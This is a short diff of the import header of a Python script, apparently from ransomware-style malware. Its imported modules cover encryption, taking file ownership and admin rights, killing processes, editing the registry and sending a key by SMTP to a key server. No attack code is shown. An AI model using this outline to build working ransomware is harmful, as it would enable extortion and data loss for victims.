@@ -1,12 +1,10 @@
 #!/usr/bin/python
 #coding:utf-8
-from timeit import default_timer
-from cryptography.fernet import Fernet
 from modules.crypt import crypt
 from modules.permission import takeown, icacls, get_admin_rights
 from modules.system import delproc, regedit
 from modules.network import host_connect, sendkey_smtp, keyserver
-import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
+import os, sys, ctypes, time
 
 """ THIS FILE IS PART OF THE FINAL EXECUTABLES """
 
